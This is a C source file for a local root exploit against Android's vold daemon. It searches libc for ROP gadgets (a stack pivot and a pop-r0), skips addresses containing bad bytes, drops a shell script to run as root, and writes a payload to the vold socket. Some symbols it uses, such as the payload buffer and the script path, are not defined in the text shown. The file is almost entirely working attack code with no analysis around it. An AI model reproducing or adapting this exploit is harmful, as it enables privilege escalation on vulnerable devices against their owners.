#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>

#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/un.h>

#include <dirent.h>

#include <dlfcn.h>

#include <sys/system_properties.h>
#include "sockets.h"
#include "android_filesystem_config.h"
#include "install.h"


static char *vold = "/system/bin/vold";
static char *code = "#!/system/bin/sh\necho pwned! > /data/local/tmp/asd\nrm $0\n";

uint32_t stack_pivot = 0x41414141;
uint32_t pop_r0 = 0x41414141;
uint32_t libc_base = 0;


static int bad_byte(uint8_t byte)
{
  switch(byte) {
  case 0x20:
  case 0x22:
  case 0x5c:
  case 0x00:
    return 1;
    break;
  default:
    break;
  }
  return 0;
}



static int check_addr(uint32_t addr)
{
  /*                                                                                                               
   * Check if address contains one of the forbidden bytes                                          
   */
  int i = 0;

  for(i=0; i<32; i+=8)
    if(bad_byte((addr>>i) & 0xff))
      return -1;

  return 0;
}



static void *find_symbol(char *sym)
{
  void *r = NULL;
  void *dlh = dlopen("/system/libc/libc.so", RTLD_NOW);

  r = (void *)dlsym(dlh, sym);
  dlclose(dlh);
  return r;
}



static void find_rop_gadgets()
{

  // Try to generate gadgets dynamically.

  /*                                                                                               
   * add sp, #108 -> b01b                                                            
   * pop{r4, r5, r6, r7, pc} -> bdf0                                                     
   *                                                  
   * pop{r0, pc} -> bd01         
   */

  int fd;
  char r[2], d[2];
  int n = 2;

  if((fd=open("/system/lib/libc.so", O_RDONLY)) == -1) {
    printf("Cannot open libc\n");
    exit(-1);
  }

  lseek(fd, 0x10000, SEEK_SET);

  while(n == 2 && (stack_pivot == 0x41414141 || pop_r0 == 0x41414141)) {
    n = read(fd, r, 2);
    switch(r[0]) {
    case '\x1b':
      if(stack_pivot == 0x41414141) {
        if(r[1] == '\xb0') {
          n = read(fd, d, 2);
          if(d[0] == '\xf0' && d[1] == '\xbd') {
            stack_pivot = libc_base + lseek(fd, 0, SEEK_CUR) - 4 + 1;
            if(check_addr(stack_pivot) == -1)
              stack_pivot = 0x41414141;
          }
        }
      }
      break;
    case '\x01':
      if(pop_r0 == 0x41414141) {
        if(r[1] == '\xbd') {
          pop_r0 = libc_base + lseek(fd, 0, SEEK_CUR) - 2 + 1;
          if(check_addr(pop_r0) == -1)
            pop_r0 = 0x41414141;
        }
      }
      break;
    default:
      break;
    }
  }

  // Check if found gadgets are the same of those hardcoded and in case update them.
  // If something went wrong just use the previously hardcoded values.

  if (stack_pivot != 0x41414141 && stack_pivot != final_stack_pivot) 
    final_stack_pivot = stack_pivot;

  if (pop_r0 != 0x41414141 && pop_r0 != final_pop_r0)
    final_pop_r0 = pop_r0;
}




int main(int argc, char *argv[]) {

  
  int sock = -1;
  int sent = 0;
  FILE *fp;

  printf("%d\n", sizeof(payload));

  libc_base = (uint32_t)((uint32_t) find_symbol("system")) & 0xfff00000;

  // Look dynamically for rop gadgets if libc was found, otherwise use hardcoded values
  if(libc_base)
    find_rop_gadgets();

  printf("0x%08x 0x%08x\n", final_stack_pivot, final_pop_r0);

  // Code to be executed as root
  if(!(fp=fopen(bsh, "w+"))) {
    printf("Error\n");
    //exit(-1);
  }
  fprintf(fp, code);
  fclose(fp);
  chmod(bsh, 0711);

  // Socket with vold process
  if((sock = socket_local_client("vold", ANDROID_SOCKET_NAMESPACE_RESERVED, SOCK_STREAM)) < 0) {
    printf("Socket failed\n");
    exit(-1);
  }
  // Exploiting...                                              
  if((sent = write(sock, payload, sizeof(payload)+1)) < 0)
    exit(-1);
  
  printf("Written %d bytes\n", sent);
  // Remove yourself
  //remove(argv[0]);

  close(sock); 
  
}
